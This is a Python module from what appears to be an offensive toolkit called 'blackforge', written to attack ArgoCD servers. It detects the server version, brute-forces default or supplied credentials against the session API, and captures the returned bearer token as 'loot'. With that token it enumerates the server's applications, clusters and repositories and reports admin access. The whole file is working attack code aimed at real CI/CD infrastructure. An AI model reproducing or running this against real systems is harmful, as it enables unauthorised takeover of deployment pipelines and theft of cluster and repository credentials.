"""ArgoCD exploitation: version detection, default credential brute-force,
application and cluster enumeration."""

from __future__ import annotations

from typing import Any, Dict, List

from blackforge.logger import log
from blackforge.models import AttackResult, Credential, EngagementContext
from blackforge.modules.base import BaseModule
from blackforge.utils.http import request
from blackforge.data.credentials import ARGOCD_DEFAULT_CREDS
from blackforge.data.endpoints import ARGOCD_PATHS


class ArgoCDModule(BaseModule):

    name = "argocd"

    def run(self, ctx: EngagementContext, **kwargs: Any) -> List[AttackResult]:
        url: str = kwargs.get("url", "")
        username: str = kwargs.get("username", "")
        password: str = kwargs.get("password", "")

        results: List[AttackResult] = []
        base = url.rstrip("/")
        ctx.loot.setdefault("argocd", {})

        results.extend(self._check_access(ctx, base))
        results.extend(self._bruteforce_creds(ctx, base, username, password))
        return results

    def _check_access(self, ctx: EngagementContext, base: str) -> List[AttackResult]:
        resp = request(ctx, "GET", f"{base}/api/v1/version")
        if resp and resp.ok:
            data = resp.json()
            log(f"[ArgoCD] Version: {data.get('Version', '?')}", "INFO")
            ctx.loot["argocd"]["version"] = data
            return [AttackResult(
                "argocd", "discovery", "SUCCESS", target=base,
                data=data, notes=f"ArgoCD {data.get('Version', '?')} at {base}",
            )]
        return [AttackResult("argocd", "discovery", "FAILED", target=base,
                             notes="ArgoCD API not found")]

    def _bruteforce_creds(self, ctx: EngagementContext, base: str,
                          username: str, password: str) -> List[AttackResult]:
        creds_to_try = [(username, password)] if username and password else ARGOCD_DEFAULT_CREDS
        for user, passwd in creds_to_try:
            resp = request(ctx, "POST", f"{base}/api/v1/session",
                           json={"username": user, "password": passwd})
            if resp and resp.ok:
                token = resp.json().get("token", "")
                if token:
                    log(f"[ArgoCD] Login SUCCESS: {user}:{passwd}", "CRIT")
                    ctx.credentials.append(Credential(
                        "argocd_token",
                        {"token": token, "user": user, "pass": passwd},
                        f"argocd:{base}",
                        f"ArgoCD auth token via {user}:{passwd}",
                    ))
                    hdrs = {"Authorization": f"Bearer {token}"}
                    for path_name, path in ARGOCD_PATHS.items():
                        r = request(ctx, "GET", f"{base}{path}", headers=hdrs)
                        if r and r.ok:
                            ctx.loot["argocd"][path_name] = r.json()

                    apps = ctx.loot["argocd"].get("apps", {}).get("items", [])
                    clusters = ctx.loot["argocd"].get("clusters", {}).get("items", [])
                    repos = ctx.loot["argocd"].get("repos", {}).get("items", [])
                    log(f"[ArgoCD] Apps: {len(apps)} | Clusters: {len(clusters)} | Repos: {len(repos)}", "CRIT")
                    return [AttackResult(
                        "argocd", "auth_success", "SUCCESS", target=base,
                        severity="CRITICAL",
                        data={"user": user, "apps": len(apps),
                              "clusters": len(clusters), "repos": len(repos)},
                        notes=f"ArgoCD admin access as '{user}'. "
                              f"{len(apps)} apps, {len(clusters)} clusters, {len(repos)} repos.",
                    )]
        return [AttackResult(
            "argocd", "auth_fail", "FAILED", target=base,
            notes=f"Tried {len(creds_to_try)} credential pairs — all failed",
        )]
